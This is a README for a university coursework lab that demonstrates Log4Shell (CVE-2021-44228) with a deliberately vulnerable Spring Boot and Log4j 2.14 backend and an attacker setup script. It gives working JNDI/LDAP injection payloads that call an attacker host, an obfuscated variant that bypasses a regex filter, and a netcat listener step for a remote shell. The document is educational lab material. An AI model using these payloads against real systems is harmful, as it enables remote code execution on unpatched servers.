# TPAS Log4Shell PoC

This repository contains a Proof of Concept (PoC) for the Log4Shell vulnerability (CVE-2021-44228), developed as part of the coursework for the curricular unit TPAS in the Master's degree in Information Security at FCUP.

It features:
 - A React SPA frontend that simulates a generic e-commerce website with basic features such as browsing products and view basic details such as description, price, rating, etc.., provided via the dummy json api https://dummyjson.com/docs/products
 - A Spring Boot REST API backend that uses a vulnerable version of Log4j 2.14.
 - A bash script that sets up most of the attacker side of things needed to exploit Log4Shell.

To run this stack you need to:
 - On the target host:
     - Install docker
     - Replace the <target_ip> on the NEXT_PUBLIC_BACKEND_URL env var on docker-compose.yaml
     - Run docker-compose up
 - On the attacker host:
     - Install java, python and maven
     - Open the required ports, "./init.sh --help" to see the ports and what the script does
     - Run the script init.sh
     - Run a netcat listener, nc -lvnp <port>

Once everything is running:

Place this payload on the search bar (URL encoded since it will be on a GET query param):

```
%24%7Bjndi%3Aldap%3A%2F%2F<attacker_host_ip>%3A<ldap_port>%2FExploit%7D
```

Or place this payload on the headers of a request (you can use burp suite to intercept a request and tamper it):

```
${jndi:ldap://<attacker_host_ip>:<ldap_port>/Exploit}
```

On the website, there is an icon next to the user's name that allows toggling between sanitizing the logged string using the regular expression \\$\\{jndi:.*?} or not. By default, sanitization is disabled, represented by a red demon icon. When sanitization is enabled, the icon changes to a green smiley face.

This feature can be used as a way of simulating a WAF bypass, you can add more regular expressions on the backend's LoggerManager.java class.

Here's a payload that will not be matched by the current regex:

```
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://<attacker_host_ip>:<ldap_port>/Exploit}
```
